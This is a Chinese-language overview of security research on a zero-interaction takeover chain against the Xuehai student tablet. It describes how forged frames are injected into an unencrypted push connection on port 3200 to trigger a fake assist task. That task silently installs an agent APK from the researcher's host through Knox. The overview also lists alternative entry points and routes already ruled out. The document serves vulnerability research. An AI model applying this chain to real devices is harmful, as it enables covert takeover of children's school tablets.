# 学海学生端平板 —— 完整接管链路（总览 · 2026-11-08 重构版）

> 本文是链路总览。逐环代码证据、协议字节格式与复现步骤见 **[`CHAIN-100-CODE-LEVEL.md`](CHAIN-100-CODE-LEVEL.md)**。

---

## 0. 结论

**已找到一条不需要教师账号、不需要 root、不碰平板、全程零交互的全自动接管链路**，其入口是学海自研推送 SDK 的**明文 TCP 长连接（端口 3200）**。

链路成立的两个支点：

1. **传输层可伪造**：3200 是裸 TCP + 自定义二进制帧，无 TLS、无签名校验。只要研究主机成为平板网关（移动热点），就能在用户态完整接管这条连接，注入任意下行消息。**已实机验证**：平板解析我们注入的 `MESSAGE` 帧并逐条回 `MESSAGE_FB`。
2. **业务层无门禁**：从 `dealMessage` → `LocalBroadcastManager` → `LauncherPushService.disposeMessage("assist-notify")` → `AssistModel.sendAssistMessage` → `AssistService.startAssist()` → `requestAssistTask`，**逐行确认没有任何登录态/权限/时间闸门**（唯一的 userId 过滤已用注册帧里的真实 `uid` 通过）。

之后由 `AssistService` 主动向**明文 80 端口**拉取协助任务，任务体是 ZAZE 脚本，可直接调用 `installAppOnline(url)`；安装落到 MDM 的 AIDL 服务上，走 Knox 静默安装，**11 环逐环代码级确认**。

---

## 1. 链路全景

```
[研究主机]                                    [平板 SM-P200]
  开移动热点 (192.168.137.1)  ◄──── Wi-Fi ────►  自动入网
        │
        ├─ 3200 应答器（Npcap 用户态 TCP，伪造云端 IP）
        │      ◄── AUTH 注册帧（accessKey/deviceId/uid=2112229）
        │      ──► AUTH_FB
        │      ──► MESSAGE(cmd=0x03, msgType=assist-notify)   ← 注入点
        │      ◄── MESSAGE_FB（平板已处理，实测）
        │
        ├─ 80 应答器（明文 HTTP）
        │      ◄── GET /api/v1/users/{uid}/devices/{did}/assists/{aid}/tasks
        │      ──► 伪造任务：installAppOnline("http://192.168.137.1/agent.apk")
        │
        └─ 8080 APK 服务 ──► Agent APK 下载 ──► Knox 静默安装
                                                     │
                                                     ▼
                                          平板内 Agent 落地
                                          → 广播 / ContentProvider 全接管
```

---

## 2. 逐环状态

| 层 | 环节 | 状态 |
|---|---|---|
| 网络 | 移动热点 + 平板入网 | ✅ 实测 |
| 网络 | 3200 双向接管（seq 精确记账） | ✅ 实测 |
| 协议 | 注册帧解析（uid/deviceId/signature） | ✅ 实测 |
| 协议 | MESSAGE 帧构造（长度编码/msgId/JSON） | ✅ 实测 |
| 协议 | 平板解析并回执 | ✅ 实测 |
| App | 广播 → LauncherPushService → AssistModel | ✅ 代码级（无门禁） |
| App | AssistService startAssist → requestAssistTask | ✅ 代码级 |
| App | 明文任务下发 → ZAZE → installAppOnline | ✅ 代码级 |
| 安装 | DownloadManager → ApplicationPolicyProxy → MdmPolicy → MdmService → Knox | ✅ 代码级（11 环） |
| 运行 | **LauncherPushService 是否已注册** | ⚠️ 待解锁（见下） |

---

## 3. 已知唯一阻断点

`XhApplication.onCreate():677-693` —— 若 `CrashLevelManager.isSeriousCrash()` 为真，直接 `return-void`，**整段 `doOnMainProcess()` 被跳过**，其中包含 `ApplicationLikeMessage.onCreateOnMainProcess():340-357` 的 `LauncherPushService` 注册。

App 自带两段式自愈：第 1 次启动由 `WelcomeActivity` → `SafeActivity` → `postClear(5000)` 清标志；**第 2 次启动**才恢复正常初始化。

⇒ 解锁动作：**连续重启平板两次**。

---

## 4. 备选链路

- **4.1 Launcher 自检 WebView**：`NetworkUtil.checkConnect():992` 加载明文 `http://www.zjxhedu.com/data/wifi.html`，该 WebView 挂 `LauncherJs` 原生桥 → 可在 launcher 进程内执行 JS，不依赖推送注册状态。
- **4.2 已装 APK 的零日链**：`ControlReceiver`（`com.xuehai.control.action.all_control`，动态注册无权限）+ `content://com.xh.zhitongyun.provider/control`（`exported=true`，无权限校验）。

---

## 5. 历史已证伪路径

Tinker 明文补丁 / 443 中间人 / 改线路配置 / 3200 老格式帧 / control 表注入 / wifimanager JS 桥 / `getUserNeedInstallAppList` / `executeCmd` 提权 —— 逐条死因见 `CHAIN-100-CODE-LEVEL.md` 第 5 节。

---

*2026-11-08 · 全部结论基于 smali 反编译源码 + 实机抓包*
